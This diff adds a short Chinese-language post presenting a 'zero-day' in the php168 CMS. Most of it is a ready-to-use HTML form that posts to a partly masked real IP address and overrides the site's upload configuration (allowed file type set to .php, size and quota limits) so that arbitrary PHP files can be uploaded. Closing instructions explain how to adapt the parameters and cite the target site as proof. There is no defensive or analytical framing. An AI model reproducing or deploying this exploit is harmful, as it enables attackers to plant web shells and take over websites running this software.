@@ -1,0 +1,10 @@
+php168漏洞2(0day)
+
+利用方法:
+
+<form name="form1" method="post" action="h t t p://219.135.*.*/upload.php?uploadlf=index.php&uploadlfj_name=php.php&webdb[upload_type]=.php&lfjdb[p_num]=0&mgroupdb[upload_day_num]=2&webdb[upload_size]=500&updir=upload_files/face" enctype="multipart/form-data">
+<input class=mmcinb type="file" name="uploadlfj" >
+<input class=mmcinb type="submit" name="Submit" value="上传文件">
+<input type="hidden" name="1action" value="uploadfile">
+</form>
+把它保存为htm文件,利用地址中的uploadlfj就可以看源码,用input中的uploadlfj就可以上传,相应的uploadlfj_name和webdb[upload_type值也要改哦!     219.135.*.*站就是可列目录的站,写出来只是证明这漏洞可上传php文件,虽然没返回,但可以在网站上看到
